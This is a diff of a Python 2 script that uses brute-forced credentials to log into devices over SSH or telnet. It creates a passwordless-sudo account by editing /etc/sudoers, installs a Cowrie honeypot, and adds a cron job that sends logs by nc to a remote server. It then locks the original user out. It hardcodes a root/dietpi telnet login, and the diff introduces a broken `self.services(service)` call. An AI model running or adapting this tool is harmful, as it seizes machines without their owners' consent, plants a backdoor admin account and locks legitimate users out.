@@ -30,21 +30,26 @@ def parse_arguments():
 	results = parser.parse_args()
 	return results
 
-#Create a class to hold host information.
-class Host:
-	def __init__(self, IP, service, user, passwd):
-		self.processed = False
-		self.IP = IP
-		self.service = service
+#Create a class to hold service information.
+class Service:
+	def __init__(self, protocol, user, passwd):
+		self.protocol = protocol
 		self.user = user
 		self.passwd = passwd
 
-def doSSH(host, newuser, newpass, results):
+#Create a class to hold host information.
+class Host:
+	def __init__(self, IP, service):
+		self.processed = False
+		self.IP = IP
+		self.services(service)
+
+def doSSH(host, service, newuser, newpass, results):
 	#TODO: Error check the subprocess return code
 	host.processed = True
 
 	print "{IP}: Checking available disk space".format(IP=host.IP)
-	disk_space_command = "sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} 'df -B1 --output=avail / | sed '1d''".format(passwd=host.passwd, user=host.user, IP=host.IP)
+	disk_space_command = "sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} 'df -B1 --output=avail / | sed '1d''".format(passwd=service.passwd, user=service.user, IP=host.IP)
 	disk_space_process = subprocess.Popen(disk_space_command, stdout=subprocess.PIPE, shell=True)
 	disk_space_process.wait()
 	disk_space_output, disk_space_error = disk_space_process.communicate()
@@ -82,14 +87,14 @@ def doSSH(host, newuser, newpass, results):
 	passhash = re.sub(r"\$", "\\$", pass_output).rstrip()
 
 	print "{IP}: Adding new user {newuser}".format(IP=host.IP, newuser=newuser)
-	#newuser_command = "sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} -p 1022 'sudo adduser --gecos "" --disabled-password {anewuser} && echo {anewuser}:{anewuserpassword} | sudo chpasswd'".format(passwd=host.passwd, user=host.user, IP=host.IP, anewuser=newuser, anewuserpassword=newpass)
-	newuser_command = '''sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} "sudo useradd -m -s /bin/bash -g sudo -p '{encpass}' {newuser}"'''.format(passwd=host.passwd, user=host.user, IP=host.IP, encpass=passhash, newuser=newuser)
+	#newuser_command = "sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} -p 1022 'sudo adduser --gecos "" --disabled-password {anewuser} && echo {anewuser}:{anewuserpassword} | sudo chpasswd'".format(passwd=service.passwd, user=service.user, IP=host.IP, anewuser=newuser, anewuserpassword=newpass)
+	newuser_command = '''sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} "sudo useradd -m -s /bin/bash -g sudo -p '{encpass}' {newuser}"'''.format(passwd=service.passwd, user=service.user, IP=host.IP, encpass=passhash, newuser=newuser)
 	newuser_process = subprocess.Popen(newuser_command, stdout=subprocess.PIPE, shell=True)
 	newuser_process.wait()
 	newuser_output, newuser_error = newuser_process.communicate()
 
 	print "{IP}: Sudoing new user {newuser}".format(IP=host.IP, newuser=newuser)
-	sudo_user_command = '''sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} 'sudo echo "{newuser} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' '''.format(passwd=host.passwd, user=host.user, IP=host.IP, newuser=newuser)
+	sudo_user_command = '''sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} 'sudo echo "{newuser} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' '''.format(passwd=service.passwd, user=service.user, IP=host.IP, newuser=newuser)
 	sudo_user_process = subprocess.Popen(sudo_user_command, stdout=subprocess.PIPE, shell=True)
 	sudo_user_process.wait()
 	sudo_user_output, sudo_user_error = sudo_user_process.communicate()
@@ -97,13 +102,13 @@ def doSSH(host, newuser, newpass, results):
 	install_size=235929600
 	if int(disk_space_output) > install_size: #Check to make sure the available diskspace is greater than 225Mb to make sure the full honeypot install will fit.
 		print "{IP}: Transferring honeypot install script".format(IP=host.IP)
-		transfer_install_command = "cat honeypot_install.sh | sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} 'cat > honeypot_install.sh'".format(passwd=host.passwd, user=host.user, IP=host.IP)
+		transfer_install_command = "cat honeypot_install.sh | sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} 'cat > honeypot_install.sh'".format(passwd=service.passwd, user=service.user, IP=host.IP)
 		transfer_install_process = subprocess.Popen(transfer_install_command, stdout=subprocess.PIPE, shell=True)
 		transfer_install_process.wait() #This wait ensures that the process finishes before we try to communicate. Else we break the pipe.
 		transfer_install_output, transfer_install_error = transfer_install_process.communicate()
 
 		print "{IP}: Running install script".format(IP=host.IP)
-		setup_command = "sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} 'chmod +x honeypot_install.sh && ./honeypot_install.sh {newuser}'".format(passwd=host.passwd, user=host.user, IP=host.IP, newuser=newuser)
+		setup_command = "sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} 'chmod +x honeypot_install.sh && ./honeypot_install.sh {newuser}'".format(passwd=service.passwd, user=service.user, IP=host.IP, newuser=newuser)
 		setup_process = subprocess.Popen(setup_command, stdout=subprocess.PIPE, shell=True)
 		setup_process.wait()
 		setup_output, setup_error = setup_process.communicate()
@@ -117,23 +122,23 @@ def doSSH(host, newuser, newpass, results):
 			get_local_ip_output = get_local_ip_output.rstrip()
 
 			print "{IP}: Adding cron job to send JSON to report server at {server}".format(IP=host.IP, server=get_local_ip_output)
-			report_command = '''sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} -p 1022 '(crontab -u {newuser} -l ; echo "00 06 * * * nc -w 3 {server} 3333 < /home/cowrie/cowrie/log/cowrie.json") | crontab -u {newuser} -' '''.format(passwd=host.passwd, user=host.user, IP=host.IP, server=get_local_ip_output, newuser=newuser)
+			report_command = '''sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} -p 1022 '(crontab -u {newuser} -l ; echo "00 06 * * * nc -w 3 {server} 3333 < /home/cowrie/cowrie/log/cowrie.json") | crontab -u {newuser} -' '''.format(passwd=service.passwd, user=service.user, IP=host.IP, server=get_local_ip_output, newuser=newuser)
 		else:
 			print "{IP}: Adding cron job to send JSON to report server at {server}".format(IP=host.IP, server=results.server_address)
-			report_command = '''sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} -p 1022 '(crontab -u {newuser} -l ; echo "00 06 * * * nc -w 3 {server} 3333 < /home/cowrie/cowrie/log/cowrie.json") | crontab -u {newuser} -' '''.format(passwd=host.passwd, user=host.user, IP=host.IP, server=results.server_address, newuser=newuser)
+			report_command = '''sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} -p 1022 '(crontab -u {newuser} -l ; echo "00 06 * * * nc -w 3 {server} 3333 < /home/cowrie/cowrie/log/cowrie.json") | crontab -u {newuser} -' '''.format(passwd=service.passwd, user=service.user, IP=host.IP, server=results.server_address, newuser=newuser)
 		report_process = subprocess.Popen(report_command, stdout=subprocess.PIPE, shell=True)
 		report_process.wait() #This wait ensures that the process finishes before we try to communicate. Else we break the pipe.
 		report_output, report_error = report_process.communicate()
 	else:
 		print "{IP}: Not enough space to install honeypot".format(IP=host.IP)
 
-	print "{IP}: Disabling old user {olduser}".format(IP=host.IP, olduser=host.user)
-	deluser_command = "sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} -p 1022 'sudo passwd -l {user}'".format(passwd=host.passwd, user=host.user, IP=host.IP)
+	print "{IP}: Disabling old user {olduser}".format(IP=host.IP, olduser=service.user)
+	deluser_command = "sshpass -p {passwd} ssh -o StrictHostKeyChecking=no {user}@{IP} -p 1022 'sudo passwd -l {user}'".format(passwd=service.passwd, user=service.user, IP=host.IP)
 	deluser_process = subprocess.Popen(deluser_command, stdout=subprocess.PIPE, shell=True)
 	deluser_process.wait()
 	deluser_output, deluser_error = deluser_process.communicate()
 
-def doTelnet(host, newuser, newpass, results):
+def doTelnet(host, service, newuser, newpass, results):
 	#First thing I'm going to do is transfer an ssh setup file via netcat. Then I'm going to run it via telnet. Only after that will telnet be blocked.
 	#TODO: Error checking? More difficult than with SSH because the subprocess return code can't be checked.
 	#TODO: Disk space checking should use a regex. Assuming what comes after Avail is the correct number is dangerous if a different program writes to the terminal in between Avail and the num.
@@ -156,9 +161,9 @@ def doTelnet(host, newuser, newpass, results):
 
 	print "{IP}: Logging in".format(IP=host.IP)
 	tn1.read_until("login: ")
-	tn1.write(host.user + "\r\n")
+	tn1.write(service.user + "\r\n")
 	tn1.read_until("Password: ")
-	tn1.write(host.passwd + "\r\n")
+	tn1.write(service.passwd + "\r\n")
 
 	print "{IP}: Checking available disk space".format(IP=host.IP)
 	tn1.write("df -B1 --output=avail /\r\n")
@@ -177,9 +182,9 @@ def doTelnet(host, newuser, newpass, results):
 
 	print "{IP}: Relogging in".format(IP=host.IP)
 	tn.read_until("login: ")
-	tn.write(host.user + "\r\n")
+	tn.write(service.user + "\r\n")
 	tn.read_until("Password: ")
-	tn.write(host.passwd + "\r\n")
+	tn.write(service.passwd + "\r\n")
 
 	install_size=136314880
 	if int(actual_disk_space) > install_size:
@@ -236,18 +241,22 @@ def doTelnet(host, newuser, newpass, results):
 		print "{IP}: Sudoing new user {newuser}".format(IP=host.IP, newuser=newuser)
 		tn.write('''sudo echo "{newuser} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\r\n'''.format(newuser=newuser))
 
-		print "{IP}: Disabling old user {olduser}".format(IP=host.IP, olduser=host.user)
-		tn.write('''sudo passwd -l {user}\r\n'''.format(user=host.user))
+		print "{IP}: Disabling old user {olduser}".format(IP=host.IP, olduser=service.user)
+		tn.write('''sudo passwd -l {user}\r\n'''.format(user=service.user))
 		tn.write("exit\r\n")
 		tn.read_all()
 
 def run(host, results):
 	#Run the honeypot setup script on the remote system.
 	randpass = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(results.pass_length))
-	if host.service == "[ssh]" and host.processed == False:
+	if "[ssh]" in [service.protocol for service in host.services]:
 		host.processed = True
 		passwd = ""
 		user = ""
+		aService = None
+		for service in host.services:
+			if service.protocol == "[ssh]":
+				aService = service
 		if results.pass_type == "random":
 			passwd = randpass
 		else:
@@ -257,12 +266,15 @@ def run(host, results):
 		else:
 			user = results.user_type
 
-		doSSH(host, user, passwd, results)
-
-	if host.service == "[telnet]" and host.processed == False:
+		doSSH(host, aService, user, passwd, results)
+	elif "[telnet]" in [service.protocol for service in host.services]:
 		host.processed = True
 		passwd = ""
 		user = ""
+		aService = None
+		for service in host.services:
+			if service.protocol == "[telnet]":
+				aService = service
 		if results.pass_type == "random":
 			passwd = randpass
 		else:
@@ -272,8 +284,10 @@ def run(host, results):
 		else:
 			user = results.user_type
 
-		doTelnet(host, user, passwd, results)
-		doSSH(host, user, passwd, results)
+		doTelnet(host, aService, user, passwd, results)
+		doSSH(host, aService, user, passwd, results)
+	else:
+		print "Something has gon horribly wrong in run()"
 
 def main():
 	results = parse_arguments()
@@ -301,18 +315,24 @@ def main():
 	print "Processing hosts"
 	hosts = []
 	# Telnet is extremely and notoriously difficult to bruteforce just because of how it works. For this reason I have added a guarenteed working Telnet example.
-	hosts.append(Host("192.168.1.76", "[telnet]", "root", "dietpi"))
+	hosts.append(Host("192.168.1.76", Service("[telnet]", "root", "dietpi")))
 	for line in real_output:
 		if line:
 			anIP = line.split()[4]
-			aService = line.split()[2]
+			aProtocol = line.split()[2]
 			aUser = line.split()[6]
 			aPass = line.split()[8]
 			if aPass == "(none)": #If the pass is (none) then it should be blank
 				aPass = ""
-			aHost = Host(anIP, aService, aUser, aPass)
-			print "Destination: {IP}, Service: {service}, User: {user}, Password: {password}".format(IP=anIP, service=aService, user=aUser, password=aPass)
-			hosts.append(aHost)
+			if anIP in [host.IP for host in hosts]:
+				aService = Service(aProtocol, aUser, aPass)
+				for host in hosts:
+					if host.IP == anIP:
+						host.services.append(aService)
+			else:
+				aHost = Host(anIP, Service(aProtocol, aUser, aPass))
+				hosts.append(aHost)
+			print "Destination: {IP}, Protocol: {service}, User: {user}, Password: {password}".format(IP=anIP, service=aProtocol, user=aUser, password=aPass)
 
 	#Now loop through the addresses and their respective protocol (telnet or ssh).
 	#Also create a thread pool to speed things up if the user chooses.
